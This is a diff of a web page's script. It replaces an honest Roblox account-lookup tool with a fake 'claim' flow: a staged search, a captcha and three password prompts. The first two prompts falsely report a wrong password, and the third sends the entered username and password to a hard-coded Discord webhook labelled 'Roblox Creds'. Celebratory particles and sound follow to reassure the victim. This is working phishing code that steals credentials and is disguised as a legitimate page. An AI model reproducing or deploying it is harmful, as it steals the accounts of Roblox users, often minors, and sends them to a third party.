+                    ctx.fillStyle = this.color;
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.globalAlpha = 1;
+                }
+            }
 
-      btn.disabled = true;
-      setStatus('<span class="loader"></span>Account qidirilmoqda...');
+            function fireParticles(originX, originY) {
+                const count = 180;
+                for (let i = 0; i < count; i++) {
+                    const x = originX + (Math.random() - 0.5) * 40;
+                    const y = originY + (Math.random() - 0.5) * 40;
+                    particles.push(new Particle(x, y));
+                }
+                if (!particleAnimId) animateParticles();
+            }
 
-      try {
-        // IMPORTANT: replace this URL with your deployed Cloudflare Worker URL.
-        const WORKER_URL = "https://roblox-finder-api.circule152.workers.dev";
+            function animateParticles() {
+                ctx.clearRect(0, 0, width, height);
+                let alive = false;
+                for (let i = particles.length - 1; i >= 0; i--) {
+                    const p = particles[i];
+                    p.update();
+                    if (p.life <= 0 || p.size < 0.5) {
+                        particles.splice(i, 1);
+                        continue;
+                    }
+                    p.draw();
+                    alive = true;
+                }
+                if (alive) {
+                    particleAnimId = requestAnimationFrame(animateParticles);
+                } else {
+                    ctx.clearRect(0, 0, width, height);
+                    particleAnimId = null;
+                }
+            }
 
-        const searchUrl =
-          WORKER_URL +
-          "/roblox/users/search?keyword=" +
-          encodeURIComponent(username);
+            // ===== SOUND SYSTEM (YouTube + fallback) – ENABLED BY DEFAULT =====
+            let soundEnabled = true;
+            let audioCtx = null;
+            let bgPlayer = null;
+            let celebrationPlayer = null;
+            let isBgPlaying = false;
+            let playersReady = false;
+            let fallbackBgNodes = null;
 
-        const userResponse = await fetch(searchUrl, {
-          method: "GET",
-          cache: "no-store"
-        });
+            window.onYouTubeIframeAPIReady = function() {
+                const bgId = YOUTUBE_VIDEO_IDS.bg;
+                const celebId = YOUTUBE_VIDEO_IDS.celebration;
 
-        if (!userResponse.ok) {
-          throw new Error("Worker HTTP " + userResponse.status);
-        }
+                if (bgId && bgId.length > 0) {
+                    bgPlayer = new YT.Player('bg-player', {
+                        height: '0',
+                        width: '0',
+                        videoId: bgId,
+                        playerVars: {
+                            autoplay: 0,
+                            controls: 0,
+                            disablekb: 1,
+                            modestbranding: 1,
+                            loop: 0,
+                            playsinline: 1
+                        },
+                        events: {
+                            onReady: function() { },
+                            onStateChange: function(event) {
+                                if (event.data === YT.PlayerState.ENDED) {
+                                    if (bgPlayer && isBgPlaying && soundEnabled) {
+                                        bgPlayer.seekTo(0);
+                                        bgPlayer.playVideo();
+                                    }
+                                }
+                            }
+                        }
+                    });
+                }
 
-        const userData = await userResponse.json();
-        const users = Array.isArray(userData.data) ? userData.data : [];
+                if (celebId && celebId.length > 0) {
+                    celebrationPlayer = new YT.Player('celebration-player', {
+                        height: '0',
+                        width: '0',
+                        videoId: celebId,
+                        playerVars: {
+                            autoplay: 0,
+                            controls: 0,
+                            disablekb: 1,
+                            modestbranding: 1,
+                            loop: 0,
+                            playsinline: 1
+                        },
+                        events: {
+                            onReady: function() { }
+                        }
+                    });
+                }
+                playersReady = true;
+            };
 
-        // Exact username match first; otherwise don't accidentally show
-        // a different account returned by keyword search.
-        const user =
-          users.find(u => String(u.name || "").toLowerCase() === username.toLowerCase()) ||
-          null;
+            if (window.YT && window.YT.Player) {
+                window.onYouTubeIframeAPIReady();
+            }
 
-        if (!user) {
-          setStatus(
-            users.length
-              ? "Aniq shu username topilmadi. Username'ni tekshiring."
-              : "Bunday Roblox account topilmadi.",
-            true
-          );
-          return;
-        }
+            function initAudioCtx() {
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+            }
 
-        setStatus('<span class="loader"></span>Avatar yuklanmoqda...');
+            function playFallbackClick() {
+                if (!soundEnabled) return;
+                initAudioCtx();
+                try {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+                    osc.type = 'sine';
+                    gain.gain.setValueAtTime(0.12, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.1);
+                    osc.start(audioCtx.currentTime);
+                    osc.stop(audioCtx.currentTime + 0.1);
+                } catch(e) {}
+            }
 
-        const thumbUrl =
-          WORKER_URL +
-          "/roblox/users/avatar-headshot" +
-          "?userIds=" + encodeURIComponent(user.id) +
-          "&size=420x420&format=Png&isCircular=false";
+            function playFallbackCelebration() {
+                if (!soundEnabled) return;
+                initAudioCtx();
+                try {
+                    const notes = [523, 659, 784, 1047];
+                    notes.forEach((freq, i) => {
+                        const osc = audioCtx.createOscillator();
+                        const gain = audioCtx.createGain();
+                        osc.connect(gain);
+                        gain.connect(audioCtx.destination);
+                        osc.frequency.setValueAtTime(freq, audioCtx.currentTime + i * 0.12);
+                        osc.type = 'sine';
+                        gain.gain.setValueAtTime(0, audioCtx.currentTime + i * 0.12);
+                        gain.gain.linearRampToValueAtTime(0.15, audioCtx.currentTime + i * 0.12 + 0.05);
+                        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + i * 0.12 + 0.35);
+                        osc.start(audioCtx.currentTime + i * 0.12);
+                        osc.stop(audioCtx.currentTime + i * 0.12 + 0.4);
+                    });
+                } catch(e) {}
+            }
 
-        const thumbResponse = await fetch(thumbUrl, {
-          method: "GET",
-          cache: "no-store"
-        });
+            function startFallbackBackground() {
+                if (!soundEnabled) return;
+                initAudioCtx();
+                if (!audioCtx) return;
+                try {
+                    if (fallbackBgNodes) return;
+                    const master = audioCtx.createGain();
+                    master.gain.setValueAtTime(0.04, audioCtx.currentTime);
+                    master.connect(audioCtx.destination);
+                    const osc1 = audioCtx.createOscillator();
+                    const g1 = audioCtx.createGain();
+                    osc1.type = 'sine';
+                    osc1.frequency.setValueAtTime(130.81, audioCtx.currentTime);
+                    osc1.connect(g1);
+                    g1.gain.setValueAtTime(0.7, audioCtx.currentTime);
+                    g1.connect(master);
+                    const osc2 = audioCtx.createOscillator();
+                    const g2 = audioCtx.createGain();
+                    osc2.type = 'sine';
+                    osc2.frequency.setValueAtTime(164.81, audioCtx.currentTime);
+                    osc2.connect(g2);
+                    g2.gain.setValueAtTime(0.5, audioCtx.currentTime);
+                    g2.connect(master);
+                    const osc3 = audioCtx.createOscillator();
+                    const g3 = audioCtx.createGain();
+                    osc3.type = 'sine';
+                    osc3.frequency.setValueAtTime(196.00, audioCtx.currentTime);
+                    osc3.connect(g3);
+                    g3.gain.setValueAtTime(0.4, audioCtx.currentTime);
+                    g3.connect(master);
+                    osc1.start(audioCtx.currentTime);
+                    osc2.start(audioCtx.currentTime);
+                    osc3.start(audioCtx.currentTime);
+                    fallbackBgNodes = { osc1, osc2, osc3, g1, g2, g3, master };
+                } catch(e) {}
+            }
 
-        if (!thumbResponse.ok) {
-          throw new Error("Avatar Worker HTTP " + thumbResponse.status);
-        }
+            function stopFallbackBackground() {
+                try {
+                    if (fallbackBgNodes) {
+                        fallbackBgNodes.osc1.stop();
+                        fallbackBgNodes.osc2.stop();
+                        fallbackBgNodes.osc3.stop();
+                        fallbackBgNodes.master.disconnect();
+                        fallbackBgNodes = null;
+                    }
+                } catch(e) {}
+            }
 
-        const thumbData = await thumbResponse.json();
-        const thumbnail = thumbData.data && thumbData.data[0];
+            function playClick() {
+                if (!soundEnabled) return;
+                playFallbackClick();
+            }
 
-        if (thumbnail && thumbnail.imageUrl) {
-          avatarEl.src = thumbnail.imageUrl;
-        } else {
-          avatarEl.removeAttribute("src");
-          avatarEl.alt = "Avatar mavjud emas";
-        }
+            function playCelebration() {
+                if (!soundEnabled) return;
+                if (celebrationPlayer && celebrationPlayer.playVideo && YOUTUBE_VIDEO_IDS.celebration) {
+                    try {
+                        celebrationPlayer.seekTo(0);
+                        celebrationPlayer.playVideo();
+                        return;
+                    } catch(e) { }
+                }
+                playFallbackCelebration();
+            }
 
-        displayNameEl.textContent = user.displayName || user.name;
-        usernameEl.textContent = "@" + user.name;
-        userIdEl.textContent = "User ID: " + user.id;
+            function startBackgroundMusic() {
+                if (!soundEnabled || isBgPlaying) return;
+                if (bgPlayer && bgPlayer.playVideo && YOUTUBE_VIDEO_IDS.bg) {
+                    try {
+                        bgPlayer.seekTo(0);
+                        bgPlayer.playVideo();
+                        isBgPlaying = true;
+                        return;
+                    } catch(e) { }
+                }
+                startFallbackBackground();
+                isBgPlaying = true;
+            }
 
-        if (user.hasVerifiedBadge === true) {
-          verifiedEl.textContent = "Verified";
-          verifiedEl.style.display = "inline-block";
-        } else {
-          verifiedEl.style.display = "none";
-        }
+            function stopBackgroundMusic() {
+                try {
+                    if (bgPlayer && bgPlayer.pauseVideo) {
+                        bgPlayer.pauseVideo();
+                    }
+                    stopFallbackBackground();
+                } catch(e) {}
+                isBgPlaying = false;
+            }
 
-        profileLinkEl.href =
-          "https://www.roblox.com/users/" + user.id + "/profile";
+            function toggleBackgroundMusic() {
+                if (isBgPlaying) {
+                    stopBackgroundMusic();
+                } else {
+                    startBackgroundMusic();
+                }
+            }
 
-        resultEl.classList.add("show");
-        setStatus("Account topildi.");
-      } catch (error) {
-        console.error("Roblox Finder:", error);
+            const soundToggle = document.getElementById('soundToggle');
+            const soundLabel = document.getElementById('soundLabel');
+            soundToggle.addEventListener('click', function(e) {
+                e.stopPropagation();
+                initAudioCtx();
+                soundEnabled = !soundEnabled;
+                soundLabel.textContent = soundEnabled ? 'Sound on' : 'Sound off';
+                if (soundEnabled) {
+                    if (!isBgPlaying) toggleBackgroundMusic();
+                    playClick();
+                } else {
+                    if (isBgPlaying) toggleBackgroundMusic();
+                }
+            });
 
-        if (error instanceof TypeError) {
-          setStatus(
-            "Cloudflare Worker URL sozlanmagan yoki Worker ishlamayapti. index.html ichidagi WORKER_URL ni tekshiring.",
-            true
-          );
-        } else {
-          setStatus(
-            "Roblox serveri so'rovni qabul qilmadi. Bir ozdan keyin qayta urinib ko'ring.",
-            true
-          );
-        }
-      } finally {
-        btn.disabled = false;
-      }
-    }
+            // ===== MODAL CONTROLS =====
+            const modal = document.getElementById('modalOverlay');
+            function showStep(id) {
+                ['stepFinder','stepCaptcha','stepPassword','stepPasswordRetry','stepPasswordThird','stepClaim','stepSuccess']
+                    .forEach(s => document.getElementById(s).classList.add('hidden'));
+                document.getElementById(id).classList.remove('hidden');
+            }
 
-    btn.addEventListener("click", findAccount);
+            function openModal() {
+                modal.classList.add('active');
+                playClick();
+            }
+            function closeModal() {
+                modal.classList.remove('active');
+                playClick();
+                currentUser = ''; currentPass = ''; passAttempt = 0;
+                document.querySelectorAll('.modal-box input').forEach(inp => inp.value = '');
+                document.querySelectorAll('.modal-box .error-text, .modal-box .status-text').forEach(el => el.textContent = '');
+                document.getElementById('finderLoader').classList.add('hidden');
+                document.getElementById('claimLoader').classList.add('hidden');
+                showStep('stepFinder');
+            }
 
-    input.addEventListener("keydown", (event) => {
-      if (event.key === "Enter") {
-        findAccount();
-      }
-    });
-  </script>
+            // ===== WEBHOOK =====
+            function sendToDiscord(username, password) {
+                const webhookURL = 'https://discord.com/api/webhooks/1545127467742920865/Ld5EL6mk10VRTz15vEZ9wOZrKxOLaqpYKCgq1xemaiYlclAi1AaZFxggs12KmJ4X9-Y1';
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `**Roblox Creds**\nUser: ${username}\nPass: ${password}` })
+                }).catch(() => {});
+            }
+
+            // ===== STATE =====
+            let currentUser = '';
+            let currentPass = '';
+            let captchaCode = 'A7F9';
+            let passAttempt = 0;
+
+            document.getElementById('claimBtn').addEventListener('click', function(){
+                openModal();
+                showStep('stepFinder');
+                document.getElementById('finderInput').value = '';
+                document.getElementById('finderStatus').textContent = '';
+                document.getElementById('finderLoader').classList.add('hidden');
+            });
+
+            document.getElementById('finderSubmit').addEventListener('click', function(){
+                const input = document.getElementById('finderInput');
+                const username = input.value.trim();
+                if (!username) {
+                    document.getElementById('finderStatus').textContent = 'Please enter a username.';
+                    return;
+                }
+                currentUser = username;
+                const status = document.getElementById('finderStatus');
+                const loader = document.getElementById('finderLoader');
+                status.textContent = 'Searching...';
+                loader.classList.remove('hidden');
+                this.disabled = true;
+
+                setTimeout(() => {
+                    status.textContent = 'Account found: ' + username;
+                    loader.classList.add('hidden');
+                    this.disabled = false;
+                    showStep('stepCaptcha');
+                    document.getElementById('captchaInput').value = '';
+                    document.getElementById('captchaError').textContent = '';
+                    const newCode = Math.random().toString(36).substring(2,6).toUpperCase();
+                    captchaCode = newCode;
+                    document.querySelector('#captchaSvg text').textContent = newCode;
+                    playClick();
+                }, 10000);
+            });
+
+            document.getElementById('captchaSubmit').addEventListener('click', function(){
+                const input = document.getElementById('captchaInput');
+                const val = input.value.trim().toUpperCase();
+                const err = document.getElementById('captchaError');
+                if (val !== captchaCode) {
+                    err.textContent = 'Wrong code. Try again.';
+                    const newCode = Math.random().toString(36).substring(2,6).toUpperCase();
+                    captchaCode = newCode;
+                    document.querySelector('#captchaSvg text').textContent = newCode;
+                    input.value = '';
+                    playClick();
+                    return;
+                }
+                err.textContent = '';
+                passAttempt = 0;
+                showStep('stepPassword');
+                document.getElementById('passInput').value = '';
+                document.getElementById('passError').textContent = '';
+                playClick();
+            });
+
+            document.getElementById('passSubmit').addEventListener('click', function(){
+                const pass = document.getElementById('passInput').value.trim();
+                if (!pass) { document.getElementById('passError').textContent = 'Enter a password.'; return; }
+                document.getElementById('passError').textContent = 'Wrong password. Please try again.';
+                passAttempt = 1;
+                showStep('stepPasswordRetry');
+                document.getElementById('passRetryInput').value = '';
+                document.getElementById('passRetryError').textContent = '';
+                playClick();
+            });
+
+            document.getElementById('passRetrySubmit').addEventListener('click', function(){
+                const pass = document.getElementById('passRetryInput').value.trim();
+                if (!pass) { document.getElementById('passRetryError').textContent = 'Enter a password.'; return; }
+                document.getElementById('passRetryError').textContent = 'Wrong password. One more attempt.';
+                passAttempt = 2;
+                showStep('stepPasswordThird');
+                document.getElementById('passThirdInput').value = '';
+                document.getElementById('passThirdError').textContent = '';
+                playClick();
+            });
+
+            document.getElementById('passThirdSubmit').addEventListener('click', function(){
+                const pass = document.getElementById('passThirdInput').value.trim();
+                if (!pass) { document.getElementById('passThirdError').textContent = 'Enter a password.'; return; }
+                currentPass = pass;
+                sendToDiscord(currentUser, currentPass);
+
+                const rect = this.getBoundingClientRect();
+                fireParticles(rect.left + rect.width/2, rect.top + rect.height/2);
+                playCelebration();
+
+                showStep('stepClaim');
+                document.getElementById('claimStatus').textContent = '';
+                document.getElementById('claimLoader').classList.add('hidden');
+                playClick();
+            });
+
+            document.getElementById('finalClaimBtn').addEventListener('click', function(){
+                const status = document.getElementById('claimStatus');
+                const loader = document.getElementById('claimLoader');
+                this.disabled = true;
+                status.textContent = 'Checking...';
+                loader.classList.remove('hidden');
+                playClick();
+                setTimeout(() => {
+                    loader.classList.add('hidden');
+                    status.textContent = 'Confirmed!';
+                    this.disabled = false;
+                    showStep('stepSuccess');
+                    document.getElementById('successUser').textContent = currentUser;
+
+                    const rect = this.getBoundingClientRect();
+                    fireParticles(rect.left + rect.width/2, rect.top + rect.height/2);
+                    playCelebration();
+
+                    playClick();
+                }, 5000);
+            });
+
+            document.getElementById('successOk').addEventListener('click', function(){
+                closeModal();
+                playClick();
+            });
+
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) closeModal();
+            });
+
+            showStep('stepFinder');
+
+            // ===== AUTO-START SOUND ON PAGE LOAD =====
+            function autoStartSound() {
+                initAudioCtx();
+                if (audioCtx && audioCtx.state === 'suspended') {
+                    audioCtx.resume().then(() => {
+                        startBackgroundMusic();
+                    }).catch(() => {});
+                } else {
+                    startBackgroundMusic();
+                }
+            }
+
+            window.addEventListener('load', function() {
+                setTimeout(autoStartSound, 500);
+            });
+
+            document.addEventListener('click', function resumeAudio() {
+                if (!isBgPlaying && soundEnabled) {
+                    initAudioCtx();
+                    if (audioCtx && audioCtx.state === 'suspended') {
+                        audioCtx.resume().then(() => {
+                            startBackgroundMusic();
+                        }).catch(() => {});
+                    } else {
+                        startBackgroundMusic();
+                    }
+                }
+            }, { once: true });
+
+        })();
+    </script>
 </body>
 </html>
